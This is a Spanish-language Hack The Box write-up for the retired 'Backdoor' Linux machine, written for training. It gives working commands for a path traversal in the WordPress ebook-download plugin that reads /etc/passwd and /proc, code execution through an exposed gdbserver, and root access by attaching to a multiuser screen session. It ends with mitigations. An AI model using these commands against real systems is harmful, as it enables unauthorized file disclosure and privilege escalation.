---
machine: Backdoor
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, wordpress, traversal, gdbserver, screen]
---

# Backdoor — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un plugin de WordPress permite recorrer rutas y leer `/proc`. La enumeración revela un `gdbserver` expuesto y una sesión de `screen` de root con multiusuario habilitado, lo que permite adjuntarse y ejecutar como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
wpscan --url http://backdoor.htb --enumerate vp
curl "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../etc/passwd"
curl "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../proc/net/tcp"
# gdbserver local
 gdb -q -ex "target remote 127.0.0.1:1337" -ex "call system(\"id\")"
screen -ls
screen -x root/root
```

## Enumeración

- WordPress con el plugin `ebook-download` y un parámetro de descarga.
- `/proc/net/tcp` muestra un puerto interno de `gdbserver`.
- Root mantiene una sesión de `screen` accesible.

## Acceso inicial

El parámetro `ebookdownloadurl` acepta `../` y permite leer archivos. Se revisan los procesos y sockets en `/proc`, se descubre `gdbserver` y se usa para ejecutar código en el contexto del proceso depurado.

## Escalada de privilegios

La sesión `screen` de root tiene multiusuario activo. Con `screen -ls` se localiza y `screen -x root/root` adjunta la sesión sin autenticación, dando una shell de root.

## Evidencia

- Lectura de `/etc/passwd` mediante traversal.
- `gdbserver` alcanzado desde loopback y ejecución de `id`.
- `screen -x root/root` con prompt de root.

## Lecciones aprendidas

- Un plugin desactualizado puede exponer todo el sistema de archivos.
- Los sockets de depuración en loopback son ejecución si se alcanzan.
- `screen` multiusuario es una puerta si root deja sesiones abiertas.

## Mitigación y detección

- Actualizar plugins y validar rutas de descarga.
- No exponer `gdbserver` y ejecutarlo solo bajo depuración controlada.
- Deshabilitar multiusuario en `screen` y cerrar sesiones de root.

## Referencias

- [0xdf — Backdoor](https://0xdf.gitlab.io/2022/04/23/htb-backdoor.html)
- [GNU Screen — manual](https://www.gnu.org/software/screen/manual/screen.html)
- [Hack The Box — Backdoor](https://app.hackthebox.com/machines/backdoor)
